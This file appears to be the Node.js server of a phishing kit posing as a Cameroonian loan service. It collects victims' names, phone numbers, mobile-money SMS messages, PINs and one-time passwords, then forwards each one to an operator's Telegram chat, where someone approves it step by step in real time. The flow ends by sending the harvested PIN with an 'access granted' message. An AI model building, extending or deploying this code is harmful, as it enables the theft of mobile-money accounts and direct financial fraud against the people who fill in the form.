// ============================================================
// server.js – Phase 1: Polished + Invalid Credentials + Resend
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

// ... rest of your code
require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();

app.use(cors());
app.use(express.json());

app.use(express.static(path.join(__dirname, '..','frontend')));

// ─── In-Memory Store ───
const applications = {};

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

console.log('✅ Server starting...');

async function sendTelegramMessage(message, buttons = null) {
    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    return await response.json();
}

// 1. Application
app.post('/api/send-application', async (req, res) => {
    const data = req.body.applicationData;
    const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;

    applications[applicationId] = { ...data, smsStatus: 'pending', pinStatus: 'pending', otpStatus: 'pending' };
    console.log(`📝 Application created: ${applicationId}`);

    const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n\n✅ *Please approve or reject this application:*`;
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
        { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, applicationId, status: 'waiting_sms' });
});

// 2. SMS
app.post('/api/send-momo-message', async (req, res) => {
    const { momoData } = req.body;
    const { applicationId, phone, momoMessage } = momoData;

    applications[applicationId].smsMessage = momoMessage;
    applications[applicationId].smsStatus = 'pending';

    const message = `📨 *SMS VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
        { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'waiting_admin' });
});

// 3. PIN
app.post('/api/send-pin', async (req, res) => {
    const { applicationId, pin } = req.body;
    applications[applicationId].pin = pin;
    applications[applicationId].pinStatus = 'pending';

    const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
        { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'waiting_admin' });
});

// 4. OTP
app.post('/api/send-otp', async (req, res) => {
    const { applicationId, otp } = req.body;
    applications[applicationId].otp = otp;
    applications[applicationId].otpStatus = 'pending';

    const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
        { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'waiting_admin' });
});

// 5. Final
app.post('/api/send-final-details', async (req, res) => {
    const data = req.body.finalData;
    applications[data.applicationId].pinStatus = 'approved';

    const message = `✅ *LOAN COMPLETE*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +237${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;

    await sendTelegramMessage(message);
    res.json({ ok: true, status: 'dashboard_ready' });
});

// 6. Webhook
app.post('/api/telegram-webhook', async (req, res) => {
    if (req.body.callback_query) {
        const raw = req.body.callback_query.data;
        try {
            const { action, step, applicationId } = JSON.parse(raw);
            const app = applications[applicationId];
            if (!app) return res.sendStatus(200);

            if (step === 'SMS' && app.smsStatus === 'pending') {
                app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
            } else if (step === 'PIN' && app.pinStatus === 'pending') {
                app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
            } else if (step === 'OTP' && app.otpStatus === 'pending') {
                app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
            }
        } catch (e) {}
        await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
            method: 'POST',
            body: JSON.stringify({ callback_query_id: req.body.callback_query.id }),
            headers: { 'Content-Type': 'application/json' }
        });
        return res.sendStatus(200);
    }

    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const text = msg.text.trim().toUpperCase();
    const idMatch = msg.reply_to_message?.text?.match(/🆔\s*ID:\s*([A-Z0-9-]+)/);
    const applicationId = idMatch ? idMatch[1] : null;
    if (!applicationId || !applications[applicationId]) return res.sendStatus(200);

    const app = applications[applicationId];
    if (app.smsStatus === 'pending' && text === 'YES') app.smsStatus = 'approved';
    else if (app.smsStatus === 'pending' && text === 'NO') app.smsStatus = 'rejected';
    else if (app.pinStatus === 'pending' && text === 'YES') app.pinStatus = 'approved';
    else if (app.pinStatus === 'pending' && text === 'NO') app.pinStatus = 'rejected';
    else if (app.otpStatus === 'pending' && text === 'YES') app.otpStatus = 'approved';
    else if (app.otpStatus === 'pending' && text === 'NO') app.otpStatus = 'rejected';

    res.sendStatus(200);
});

// 7. Status
app.get('/api/status/:applicationId/:step', (req, res) => {
    const app = applications[req.params.applicationId];
    if (!app) return res.status(404).json({ ok: false });
    let status = 'pending';
    if (req.params.step === 'sms') status = app.smsStatus;
    else if (req.params.step === 'pin') status = app.pinStatus;
    else if (req.params.step === 'otp') status = app.otpStatus;
    res.json({ ok: true, status });
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, '..','frontend', 'index.html')));

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
